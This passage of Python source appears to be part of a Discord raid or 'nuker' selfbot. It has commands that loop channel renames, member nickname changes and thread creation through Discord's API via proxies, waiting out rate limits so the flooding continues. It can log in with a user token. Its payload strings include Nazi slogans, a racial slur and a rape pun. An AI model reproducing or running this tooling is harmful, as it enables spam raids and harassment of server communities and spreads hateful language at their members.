            pass
    else:
        try:
            while raid:
                    payload = {
                        "name": random.choice(cnames),
                        "type": "0",
                        "topic": "heil takaso"
                    }
                    r = requests.patch(f"https://discord.com/api/v9/channels/{ID}", headers=headers, json=payload, proxies={"http": proxy})
                    if r.status_code == 200:
                        print("Changed name")
                    elif r.status_code == 429:
                        json = r.json()
                        print("Rape limited")
                        await asyncio.sleep(json['retry_after'])
                    else:
                        break
        except:
            pass

cnicks = ["Sus", "Takaso doge", "heil takaso", "takaso is op", "takasus", "NEGRO", "cazzo", "sieg heil takaso", "Tak"]

@slayer.command()
async def cnick(ctx, ID = None):
    global raid
    raid = True
    try:
        await ctx.message.delete()
    except:
        pass
    if ID == None:
        try:
            while raid:
                    guild = ctx.guild.id
                    payload = {
                        "nick": random.choice(cnicks),
                    }
                    r = requests.patch(f"https://discord.com/api/v9/guilds/{guild}/members/@me", headers=headers, json=payload, proxies={"http": proxy})
                    if r.status_code == 200:
                        print("Changed nickname")
                    elif r.status_code == 429:
                        json = r.json()
                        print("Rape limited")
                        await asyncio.sleep(json['retry_after'])
                    else:
                        break
        except:
            pass
    else:
        try:
            while raid:
                    guild = ctx.guild.id
                    payload = {
                        "nick": random.choice(cnicks),
                    }
                    r = requests.patch(f"https://discord.com/api/v9/guilds/{guild}/members/{ID}", headers=headers, json=payload, proxies={"http": proxy})
                    if r.status_code == 200:
                        print("Changed nickname")
                    elif r.status_code == 429:
                        json = r.json()
                        print("Rape limited")
                        await asyncio.sleep(json['retry_after'])
                    else:
                        break
        except:
            pass
        


@slayer.command()
async def thread_flood(ctx):
    try:
        await ctx.message.delete()
    except:
        pass
    gui = ctx.channel.id
    while True:
        ca = await ctx.send(".")
        cazzo = ca.id
        payload = {
            "auto_archive_duration": "1440",
            "name": f"Takaso{random.randint(4, 4000)}",
            "type": "11"
            }
        r = requests.post(f"https://discord.com/api/v9/channels/{gui}/messages/{cazzo}/threads", headers=headers, json=payload)
        if r.status_code == 201:
            print("Created the thread.")
            await ca.delete()
        if r.status_code == 429:
            m = r.json()
            await asyncio.sleep(m['retry_after'])
        else:
            break


if account_type in Answers:
    try:
        slayer.run(usertoken, bot=False)
    except:
        print("\n%s[!] Warning [!]%s" % (blue(), reset()))
        print("\n%sLooks like your token is invalid!%s" % (red(), reset()))
else:
    try:
        slayer.run(usertoken)
    except:
        print("\n%s[!] Warning [!]%s" % (blue(), reset()))
        print("\nLooks like your %stoken%s is %sinvalid!%s" % (yellow(), reset(), red(), reset()))


fail = input("\n%sPress any key to exit%s > " % (red(), reset()))
